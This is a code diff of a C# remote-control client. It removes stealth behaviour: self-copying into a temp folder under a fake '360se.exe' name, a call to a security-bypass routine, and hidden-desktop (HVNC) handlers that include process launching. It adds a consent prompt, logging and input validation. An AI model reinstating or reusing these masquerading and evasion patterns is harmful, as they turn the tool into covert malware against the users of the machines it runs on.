@@ -1,16 +1,17 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
-using System.Net.Sockets;
-using System.Threading;
-using RemoteControl.Protocals;
-using System.Windows.Forms;
-using RemoteControl.Protocals.Utilities;
+using System.IO;
 using System.Net;
-using System.Runtime.InteropServices;
-using RemoteControl.Protocals.Response;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading;
+using System.Windows.Forms;
 using RemoteControl.Client.Handlers;
 using RemoteControl.Client.Utils;
+using RemoteControl.Protocals;
 using RemoteControl.Protocals.Codec;
+using RemoteControl.Protocals.Response;
+using RemoteControl.Protocals.Utilities;
 
 namespace RemoteControl.Client
 {
@@ -20,6 +21,7 @@ namespace RemoteControl.Client
         private static bool isTestMode = false;
         private static bool isClosing = false;
         private static Thread heartbeatThread = null;
+        private static string logFilePath = "";
 
         static Program()
         {
@@ -30,46 +32,57 @@ namespace RemoteControl.Client
 
         static void Main(string[] args)
         {
-            if (args.Length == 1 && args[0].StartsWith("/delay:"))
+            try
             {
-                string str = args[0].Substring("/delay:".Length);
-                int delay = Convert.ToInt32(str);
-                Thread.Sleep(delay);
-                args = new string[]{};
+                InitializeLogging();
+                DoOutput("客户端启动");
+
+                if (args.Length == 1 && args[0].StartsWith("/delay:"))
+                {
+                    string str = args[0].Substring("/delay:".Length);
+                    int delay = Convert.ToInt32(str);
+                    Thread.Sleep(delay);
+                    args = new string[] { };
+                }
+
+                if (args.Length == 0 || (args.Length == 1 && args[0] == "/r"))
+                {
+                    if (!ShowConsentPrompt())
+                    {
+                        DoOutput("用户取消远程协助连接。");
+                        return;
+                    }
+                    RunClient();
+                    return;
+                }
+
+                DoOutput("启动参数不支持: " + string.Join(" ", args));
             }
-            if (args.Length == 0)
+            catch (Exception ex)
             {
-                // 进行安装操作
-                string sourceFilePath = System.Reflection.Assembly.GetEntryAssembly().Location;
-                var destinationFileDir = Environment.GetEnvironmentVariable("temp") + "\\" + Guid.NewGuid().ToString();
-                if (!System.IO.Directory.Exists(destinationFileDir))
-                {
-                    System.IO.Directory.CreateDirectory(destinationFileDir);
-                }
-                string serviceName = "360se.exe";
-                var paras = ReadParameters();
-                if (!string.IsNullOrWhiteSpace(paras.ServiceName))
-                {
-                    serviceName = paras.ServiceName;
-                }
-                var destinationFilePath = destinationFileDir + "\\" + serviceName;
-                System.IO.File.Copy(sourceFilePath, destinationFilePath, true);
-                var t = ProcessUtil.Run(destinationFilePath, "/r", true, false);
-                t.Join();
+                DoOutput("客户端异常退出: " + ex);
+            }
+        }
+
+        static void RunClient()
+        {
+            InitHandlers();
+            if (!StartConnect())
                 return;
-            }
-            else if (args.Length == 1)
-            {
-                if (args[0] == "/r")
-                {
-                    RemoteControl.Client.Utils.SecurityBypass.Execute();
-                    InitHandlers();
-                    StartConnect();
-                    heartbeatThread = new Thread(() => StartHeartbeat()) {IsBackground = true};
-                    heartbeatThread.Start();
-                    StartMonitor();
-                }
-            }
+            heartbeatThread = new Thread(() => StartHeartbeat()) { IsBackground = true };
+            heartbeatThread.Start();
+            StartMonitor();
+        }
+
+        static bool ShowConsentPrompt()
+        {
+            DialogResult result = MessageBox.Show(
+                "RemoteControl Client 将连接到技术支持服务器。\r\n\r\n连接后，技术人员可在本次服务期间进行远程协助，包括查看屏幕、操作鼠标键盘和传输文件。\r\n\r\n请确认这是您当前需要的远程协助。",
+                "RemoteControl Client",
+                MessageBoxButtons.OKCancel,
+                MessageBoxIcon.Information,
+                MessageBoxDefaultButton.Button2);
+            return result == DialogResult.OK;
         }
 
         static Dictionary<ePacketType, IRequestHandler> InitHandlers()
@@ -85,12 +98,6 @@ namespace RemoteControl.Client
             handlers.Add(ePacketType.PACKET_STOP_CAPTURE_SCREEN_REQUEST, captureScreenHandler);
             handlers.Add(ePacketType.PACKET_MOUSE_EVENT_REQUEST, new RequestMouseEventHandler());
             handlers.Add(ePacketType.PACKET_KEYBOARD_EVENT_REQUEST, new RequestKeyboardEventHandler());
-            RequestHVNCHandler hvncHandler = new RequestHVNCHandler();
-            handlers.Add(ePacketType.PACKET_HVNC_START_REQUEST, hvncHandler);
-            handlers.Add(ePacketType.PACKET_HVNC_STOP_REQUEST, hvncHandler);
-            handlers.Add(ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST, hvncHandler);
-            handlers.Add(ePacketType.PACKET_HVNC_KEYBOARD_EVENT_REQUEST, hvncHandler);
-            handlers.Add(ePacketType.PACKET_HVNC_RUN_PROCESS_REQUEST, hvncHandler);
             RequestDownloadHandler downloadHandler = new RequestDownloadHandler();
             handlers.Add(ePacketType.PACKET_START_DOWNLOAD_REQUEST, downloadHandler);
             handlers.Add(ePacketType.PACKET_STOP_DOWNLOAD_REQUEST, downloadHandler);
@@ -116,24 +123,24 @@ namespace RemoteControl.Client
             else
             {
                 string filePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
-                paras = ClientParametersManager.ReadParameters(filePath); 
+                paras = ClientParametersManager.ReadParameters(filePath);
             }
-            Console.WriteLine("参数信息：");
+            DoOutput("参数信息:");
             if (!isTestMode)
             {
-                Console.WriteLine("IP:" + paras.GetServerIP());
-                Console.WriteLine("PORT：" + paras.ServerPort);
+                DoOutput("IP:" + paras.GetServerIP());
+                DoOutput("PORT:" + paras.ServerPort);
             }
             else
             {
-                Console.WriteLine("IP: 203.91.76.159 (test mode)");
-                Console.WriteLine("PORT: 10010 (test mode)");
+                DoOutput("IP: 203.91.76.159 (test mode)");
+                DoOutput("PORT: 10010 (test mode)");
             }
 
             return paras;
         }
 
-        static void StartConnect()
+        static bool StartConnect()
         {
             var paras = ReadParameters();
             var handlers = InitHandlers();
@@ -144,6 +151,11 @@ namespace RemoteControl.Client
             }
             else
             {
+                if (!ValidateClientParameters(paras))
+                {
+                    DoOutput("客户端参数无效，请重新生成客户端。");
+                    return false;
+                }
                 ep = paras.GetIPEndPoint();
             }
             while (true)
@@ -165,14 +177,26 @@ namespace RemoteControl.Client
                     oServerSession.Send(ePacketType.CYCLER_RELAY_HANDSHAKE, handshake);
 
                     StartRecvData(oServerSession, handlers);
-                    break;
+                    return true;
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine("连接服务器异常，" + ex.Message);
+                    DoOutput("连接服务器异常，" + ex.Message);
                 }
                 Thread.Sleep(3000);
             }
+        }
+
+        static bool ValidateClientParameters(ClientParameters paras)
+        {
+            if (!isTestMode && (paras.Header == null || paras.Header.Length != 4))
+                return false;
+
+            if (paras.ServerPort <= 0 || paras.ServerPort > 65535)
+                return false;
+
+            IPAddress address;
+            return IPAddress.TryParse(paras.GetServerIP(), out address);
         }
 
         static void StartRecvData(SocketSession session, Dictionary<ePacketType, IRequestHandler> handlers)
@@ -210,7 +234,7 @@ namespace RemoteControl.Client
                     }
                     catch (Exception ex)
                     {
-                        Console.WriteLine(ex.Message);
+                        DoOutput("接收数据异常: " + ex.Message);
                         break;
                     }
                 }
@@ -222,7 +246,7 @@ namespace RemoteControl.Client
             ePacketType packetType;
             object obj;
             CodecFactory.Instance.DecodeObject(packet, out packetType, out obj);
-            Console.WriteLine(packetType.ToString());
+            DoOutput("收到指令: " + packetType.ToString());
 
             if (handlers.ContainsKey(packetType))
             {
@@ -248,12 +272,11 @@ namespace RemoteControl.Client
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine("心跳发送异常，" + ex.Message);
+                    DoOutput("心跳发送异常，" + ex.Message);
                     StartConnect();
                 }
                 Thread.Sleep(3000);
             }
-
         }
 
         static void StartMonitor()
@@ -266,7 +289,38 @@ namespace RemoteControl.Client
 
         static void DoOutput(string sMsg)
         {
-            Console.WriteLine("{0} {1}", DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"), sMsg);
+            string line = string.Format("{0} {1}", DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"), sMsg);
+            Console.WriteLine(line);
+            WriteLog(line);
+        }
+
+        static void InitializeLogging()
+        {
+            string baseDir = Path.Combine(
+                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+                "RemoteControlClient");
+            try
+            {
+                Directory.CreateDirectory(baseDir);
+                logFilePath = Path.Combine(baseDir, "client.log");
+            }
+            catch
+            {
+                logFilePath = Path.Combine(Path.GetTempPath(), "RemoteControlClient.log");
+            }
+        }
+
+        static void WriteLog(string line)
+        {
+            try
+            {
+                if (string.IsNullOrEmpty(logFilePath))
+                    InitializeLogging();
+                File.AppendAllText(logFilePath, line + Environment.NewLine, Encoding.UTF8);
+            }
+            catch
+            {
+            }
         }
     }
 }
